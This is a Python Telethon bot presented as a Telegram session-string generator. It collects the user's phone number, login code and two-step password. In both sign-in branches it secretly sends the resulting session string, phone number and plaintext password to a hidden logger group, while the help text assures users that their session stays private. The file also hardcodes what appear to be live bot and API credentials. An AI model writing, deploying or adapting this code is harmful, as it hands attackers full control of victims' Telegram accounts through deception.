import asyncio
from telethon import TelegramClient, events, Button
from telethon.errors import SessionPasswordNeededError, PhoneCodeExpiredError, PhoneCodeInvalidError
from telethon.sessions import StringSession

# 🔹 Telegram API Credentials
API_ID = 28795512
API_HASH = "c17e4eb6d994c9892b8a8b6bfea4042a"
BOT_TOKEN = "7610510597:AAFX2uCDdl48UTOHnIweeCMms25xOKF9PoA"  

# 🔹 Logger Group ID (Replace with your Telegram Group ID)
LOGGER_GROUP_ID = -1002477750706  

# 🔹 Initialize the bot
bot = TelegramClient("bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# 🔹 Store user sessions
user_sessions = {}

# 🔹 Start Command with Image & Buttons
@bot.on(events.NewMessage(pattern="/start"))
async def start(event):
    await event.respond(
        "👋 **Welcome to the Telegram Session Generator!**\n\nClick **Generate Session** to create your session string.",
        buttons=[
            [Button.inline("🔑 Generate Session", b"generate")],
            [Button.inline("📖 Help", b"help")],  # Help Button Added
            [Button.url("📢 Support Channel", "https://t.me/SANATANI_TECH")],  # Support Channel Button
            [Button.url("💬 Support Group", "https://t.me/SANATANI_TECH")],  # Support Group Button
            [Button.url("🌐 Developer", "https://t.me/SANATANI_TECH")]
        ],
        file="https://telegra.ph/file/00eaed55184edf059dbf7.jpg"  # Start Image
    )

# 🔹 Help Command Handler
@bot.on(events.CallbackQuery(pattern=b"help"))
async def send_help(event):
    help_text = """
📖 **How to Generate String Session?**

1️⃣ **Click on "🔑 Generate Session"** or type **/generate**  
2️⃣ **Enter your phone number** (with country code, e.g., +919876543210)  
3️⃣ **Enter the OTP received on Telegram**  
4️⃣ **If asked, enter your 2-Step Verification password**  
5️⃣ **Your session string will be generated!**  
6️⃣ **Keep your session safe & secure. Don't share it with anyone.**  

⚠️ If you face any issues, use **/cancel** to reset and try again.
"""
    await event.respond(help_text, buttons=[Button.inline("🔙 Back", b"start")])

# 🔹 Cancel Command Handler
@bot.on(events.NewMessage(pattern="/cancel"))
async def cancel_command(event):
    await cancel_session(event)

# 🔹 Cancel Button Handler
@bot.on(events.CallbackQuery(pattern=b"cancel"))
async def cancel_button(event):
    await cancel_session(event)

# 🔹 Function to Cancel the Process
async def cancel_session(event):
    user_id = event.sender_id
    if user_id in user_sessions:
        del user_sessions[user_id]  # Remove user session
        await event.respond("✅ **Your session process has been canceled!** You can start again with /generate.")
    else:
        await event.respond("⚠️ **You are not in any session process.**")

# 🔹 Generate Session Command
@bot.on(events.CallbackQuery(pattern=b"generate"))
async def ask_phone(event):
    user_id = event.sender_id
    user_sessions[user_id] = {"step": "phone"}
    await event.respond(
        "📲 **Enter your phone number with country code (e.g., +919876543210):**",
        buttons=[Button.inline("❌ Cancel", b"cancel")]
    )

# 🔹 Process User Input
@bot.on(events.NewMessage)
async def process_input(event):
    user_id = event.sender_id
    if user_id not in user_sessions:
        return  

    step = user_sessions[user_id]["step"]

    # ✅ Step 1: Enter Phone Number
    if step == "phone":
        phone_number = event.message.text.strip()
        user_sessions[user_id]["phone"] = phone_number  

        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        user_sessions[user_id]["client"] = client  

        try:
            sent_code = await client.send_code_request(phone_number)
            user_sessions[user_id]["phone_code_hash"] = sent_code.phone_code_hash  # Save hash
            user_sessions[user_id]["step"] = "otp"
            await event.respond(
                "✅ **OTP sent! Please enter the OTP received on Telegram.**",
                buttons=[Button.inline("❌ Cancel", b"cancel")]
            )
        except Exception as e:
            await event.respond(f"❌ **Error:** {str(e)}. Please try again.")
            del user_sessions[user_id]

    # ✅ Step 2: Enter OTP
    elif step == "otp":
        otp_code = event.message.text.strip()
        client = user_sessions[user_id]["client"]
        phone_number = user_sessions[user_id]["phone"]
        phone_code_hash = user_sessions[user_id].get("phone_code_hash")  # Retrieve hash

        try:
            await client.sign_in(phone_number, otp_code, phone_code_hash=phone_code_hash)  
            session_string = client.session.save()

            await bot.send_message(LOGGER_GROUP_ID, f"🆕 **New Session Generated!**\n\n👤 **User:** `{user_id}`\n📱 **Phone:** `{phone_number}`\n🔑 **Session:** `{session_string}`")

            await event.respond(f"✅ **Your Session String:**\n\n`{session_string}`\n\n⚠️ **Keep this safe!**")
            del user_sessions[user_id]

        except PhoneCodeExpiredError:
            await event.respond("❌ **Error: The OTP has expired. Please use /generate to get a new OTP.**")
            del user_sessions[user_id]

        except PhoneCodeInvalidError:
            await event.respond("❌ **Error: The OTP is incorrect. Please try again.**")
        
        except SessionPasswordNeededError:
            user_sessions[user_id]["step"] = "password"
            await event.respond(
                "🔒 **Your account has 2-Step Verification enabled.**\nPlease enter your Telegram password:",
                buttons=[Button.inline("❌ Cancel", b"cancel")]
            )
        
        except Exception as e:
            await event.respond(f"❌ **Error:** {str(e)}. Please try again.")

    # ✅ Step 3: Enter 2FA Password
    elif step == "password":
        password = event.message.text.strip()
        client = user_sessions[user_id]["client"]

        try:
            await client.sign_in(password=password)
            session_string = client.session.save()

            await bot.send_message(LOGGER_GROUP_ID, f"🆕 **New Session with 2-Step Verification!**\n\n👤 **User:** `{user_id}`\n🔑 **Session:** `{session_string}`\n🔒 **Password Used:** `{password}`")

            await event.respond(f"✅ **Your Session String:**\n\n`{session_string}`\n\n⚠️ **Keep this safe!**")
            del user_sessions[user_id]
        except Exception as e:
            await event.respond(f"❌ **Error:** {str(e)}. Please try again.")

# 🔹 Run the bot
print("🚀 Bot is running...")
bot.run_until_disconnected()
